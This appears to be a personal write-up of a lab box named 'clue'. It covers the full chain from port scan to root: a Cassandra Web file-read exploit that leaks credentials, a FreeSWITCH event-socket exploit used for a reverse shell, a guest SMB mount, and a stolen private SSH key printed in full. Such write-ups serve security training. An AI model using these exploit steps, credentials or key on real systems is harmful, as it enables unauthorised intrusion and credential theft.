#### Info Enumerate
```
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http             Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: 403 Forbidden
139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3000/tcp open  http             Thin httpd
|_http-server-header: thin
|_http-title: Cassandra Web
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
For port 3000:

http://192.168.154.240:3000/   Cassandra Web

http://192.168.154.240:3000/hosts  elease_version":"3.11.13

https://www.exploit-db.com/exploits/49362

```
# > cassmoney.py 10.0.0.5 /proc/self/cmdline
# /usr/bin/ruby2.7/usr/local/bin/cassandra-web--usernameadmin--passwordP@ssw0rd
#
# (these creds are for auth to the running apache cassandra database server)
#
```
It is a web remote access tool,with the vunl to read local file. 

`└─$ python3 49362.py 192.168.154.240  /etc/passwd`
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
ntp:x:106:113::/nonexistent:/usr/sbin/nologin
cassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin
cassie:x:1000:1000::/home/cassie:/bin/bash
freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false
anthony:x:1001:1001::/home/anthony:/bin/bash
```

Donot know why read this /proc file/
`└─$ python3 49362.py 192.168.154.240  /proc/self/cmdline`
```
/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
```

`└─$ python3 49362.py 192.168.154.240  /etc/ssh/sshd_config`
check the ssh config file, that means we cannot ssh into host as cassie.
```
AllowUsers root anthony
```

For smb, we mount the shares to local file system
`sudo mount -t cifs //192.168.154.240/backup ./backup -o guest,vers=3.0,noexec`

searching for any password on these files, which are original files clone from github with some default settings
`(ed㉿kali)-[/tmp/…/freeswitch/etc/freeswitch/autoload_configs]`
`└─$ grep -rn "word" .`
```
./event_socket.conf.xml:6:    <param name="password" value="ClueCon"/>
```
try to ssh it as anthny. did not work. then check this same filename in the host

`└─$ python3 49362.py 192.168.154.240  /etc/freeswitch/autoload_configs/event_socket.conf.xml`
```
<configuration name="event_socket.conf" description="Socket Client">
  <settings>
    <param name="nat-map" value="false"/>
    <param name="listen-ip" value="0.0.0.0"/>
    <param name="listen-port" value="8021"/>
    <param name="password" value="StrongClueConEight021"/>
  </settings>
```
we get a passwd.

#### foothold
We found freeswith folder in smb shares, I didnot get the version of software, but try the vulns

https://www.exploit-db.com/exploits/47799

`└─$ python3 a.py 192.168.154.240 id`
```
Authenticated
Content-Type: api/response
Content-Length: 63
```
It works, so we try run revere shell using this exploit. seems it only work for port 3000 which is open for public.

`└─$ nc -nvlp 3000`
```
listening on [any] 3000 ...
connect to [192.168.45.249] from (UNKNOWN) [192.168.154.240] 46868
id
uid=998(freeswitch) gid=998(freeswitch) groups=998(freeswitch)
cd /home
```

#### Priv Es
```
cd cassie
ls -la
total 32
drwxr-xr-x 4 cassie cassie 4096 Aug 11  2022 .
drwxr-xr-x 4 root   root   4096 Aug  5  2022 ..
lrwxrwxrwx 1 root   root      9 Aug  5  2022 .bash_history -> /dev/null
-rw-r--r-- 1 cassie cassie  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 cassie cassie 3526 Apr 18  2019 .bashrc
drwx------ 3 cassie cassie 4096 Aug 11  2022 .gnupg
-rw------- 1 cassie cassie 1823 Aug 11  2022 id_rsa
-rw-r--r-- 1 cassie cassie  807 Apr 18  2019 .profile
drwx------ 2 cassie cassie 4096 Aug 11  2022 .ssh
```
Found a private ssh key in cassie's home folder.

`su cassie`
```
SecondBiteTheApple330
id
uid=1000(cassie) gid=1000(cassie) groups=1000(cassie)
```

`cat id_rsa`
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAw59iC+ySJ9F/xWp8QVkvBva2nCFikZ0VT7hkhtAxujRRqKjhLKJe
d19FBjwkeSg+PevKIzrBVr0JQuEPJ1C9NCxRsp91xECMK3hGh/DBdfh1FrQACtS4oOdzdM
jWyB00P1JPdEM4ojwzPu0CcduuV0kVJDndtsDqAcLJr+Ls8zYo376zCyJuCCBonPVitr2m
B6KWILv/ajKwbgrNMZpQb8prHL3lRIVabjaSv0bITx1KMeyaya+K+Dz84Vu8uHNFJO0rhq
gBAGtUgBJNJWa9EZtwws9PtsLIOzyZYrQTOTq4+q/FFpAKfbsNdqUe445FkvPmryyx7If/
DaMoSYSPhwAAA8gc9JxpHPScaQAAAAdzc2gtcnNhAAABAQDDn2IL7JIn0X/FanxBWS8G9r
acIWKRnRVPuGSG0DG6NFGoqOEsol53X0UGPCR5KD4968ojOsFWvQlC4Q8nUL00LFGyn3XE
QIwreEaH8MF1+HUWtAAK1Lig53N0yNbIHTQ/Uk90QziiPDM+7QJx265XSRUkOd22wOoBws
mv4uzzNijfvrMLIm4IIGic9WK2vaYHopYgu/9qMrBuCs0xmlBvymscveVEhVpuNpK/RshP
HUox7JrJr4r4PPzhW7y4c0Uk7SuGqAEAa1SAEk0lZr0Rm3DCz0+2wsg7PJlitBM5Orj6r8
UWkAp9uw12pR7jjkWS8+avLLHsh/8NoyhJhI+HAAAAAwEAAQAAAQBjswJsY1il9I7zFW9Y
etSN7wVok1dCMVXgOHD7iHYfmXSYyeFhNyuAGUz7fYF1Qj5enqJ5zAMnataigEOR3QNg6M
mGiOCjceY+bWE8/UYMEuHR/VEcNAgY8X0VYxqcCM5NC201KuFdReM0SeT6FGVJVRTyTo+i
CbX5ycWy36u109ncxnDrxJvvb7xROxQ/dCrusF2uVuejUtI4uX1eeqZy3Rb3GPVI4Ttq0+
0hu6jNH4YCYU3SGdwTDz/UJIh9/10OJYsuKcDPBlYwT7mw2QmES3IACPpW8KZAigSLM4fG
Y2Ej3uwX8g6pku6P6ecgwmE2jYPP4c/TMU7TLuSAT9TpAAAAgG46HP7WIX+Hjdjuxa2/2C
gX/VSpkzFcdARj51oG4bgXW33pkoXWHvt/iIz8ahHqZB4dniCjHVzjm2hiXwbUvvnKMrCG
krIAfZcUP7Ng/pb1wmqz14lNwuhj9WUhoVJFgYk14knZhC2v2dPdZ8BZ3dqBnfQl0IfR9b
yyQzy+CLBRAAAAgQD7g2V+1vlb8MEyIhQJsSxPGA8Ge05HJDKmaiwC2o+L3Er1dlktm/Ys
kBW5hWiVwWoeCUAmUcNgFHMFs5nIZnWBwUhgukrdGu3xXpipp9uyeYuuE0/jGob5SFHXvU
DEaXqE8Q9K14vb9by1RZaxWEMK6byndDNswtz9AeEwnCG0OwAAAIEAxxy/IMPfT3PUoknN
Q2N8D2WlFEYh0avw/VlqUiGTJE8K6lbzu6M0nxv+OI0i1BVR1zrd28BYphDOsAy6kZNBTU
iw4liAQFFhimnpld+7/8EBW1Oti8ZH5Mx8RdsxYtzBlC2uDyblKrG030Nk0EHNpcG6kRVj
4oGMJpv1aeQnWSUAAAAMYW50aG9ueUBjbHVlAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

`└─$ ssh -i id root@192.168.154.240`
```
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Apr 29 17:57:54 2024
root@clue:~# id
uid=0(root) gid=0(root) groups=0(root)
```

`root@clue:/home/cassie# find / -name *.txt 2>/dev/null`
```
/var/lib/freeswitch/local.txt
```

#### lesson learned
CTF like
- mount smb shared folders to local system
- grep -rn  to find "keyword" in local files
